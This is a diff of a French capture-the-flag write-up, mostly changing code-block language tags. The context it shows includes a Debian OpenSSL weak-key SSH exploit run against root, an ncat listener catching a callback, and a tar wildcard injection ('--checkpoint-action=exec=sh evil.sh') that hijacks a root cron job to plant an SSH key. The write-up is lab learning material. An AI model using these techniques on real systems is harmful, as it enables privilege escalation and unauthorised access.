@@ -47,7 +47,7 @@ Un scan de port UDP (généralement inintéressant sur les CTF) et une tentative
 
 Au vu de la version du *OpenSSH* et de la date de publication du CTF on peut tenter [un exploit](https://www.exploit-db.com/exploits/5720/) pour la faille introduite par Debian :  
 
-```plain
+```shellsession
 $ python2 exploit.py rsa/2048 192.168.1.43 root 22 5
 
 -OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
@@ -175,7 +175,7 @@ print(response.text)
 
 et le miracle s'accomplit dans un ncat préalablement lancé :  
 
-```plain
+```shellsession
 $ sudo ncat -l -p 21 -v
 Ncat: Version 7.01 ( https://nmap.org/ncat )
 Ncat: Listening on :::21
@@ -243,7 +243,7 @@ Il y a un utilisateur *rene* (par rapport à [Magritte](https://fr.wikipedia.org
 
 Cet utilisateur a un dossier personnel que l'on peut visiter et plus encore :  
 
-```plain
+```shellsession
 $ ls -alR /home/rene
 /home/rene:
 total 24
@@ -273,7 +273,7 @@ $ file /home/rene/backup/*
 
 En attendant voici la config qui nous bloquait l'accès à Apache :  
 
-```plain
+```apacheconf
 $ cat .htaccess
 AuthUserFile /var/www/html/.htpasswd
 AuthName "index.php"
@@ -342,8 +342,8 @@ Ce script rajoute ma clé publique SSH aux clés autorisées de root et au cas o
 
 Il ne reste plus qu'à mettre en place les fichiers qui vont s'injecter dans la commande du crontab :  
 
-```plain
-cd /home/rene/backup; touch -- "--checkpoint=1" touch -- "--checkpoint-action=exec=sh evil.sh"; touch a
+```bash
+cd /home/rene/backup; touch -- "--checkpoint=1"; touch -- "--checkpoint-action=exec=sh evil.sh"; touch a
 ```
 
 On attend un peu et on touche le jackpot :  
@@ -358,6 +358,5 @@ Au passage le script qui générait les fichiers BAK n'était là que pour la fo
 head -c $RANDOM /dev/urandom > "/home/rene/backup/sys-$RANDOM.BAK"
 chown rene:rene /home/rene/backup/*.BAK
 ```
-
 
 *Published November 17 2017 at 16:47*
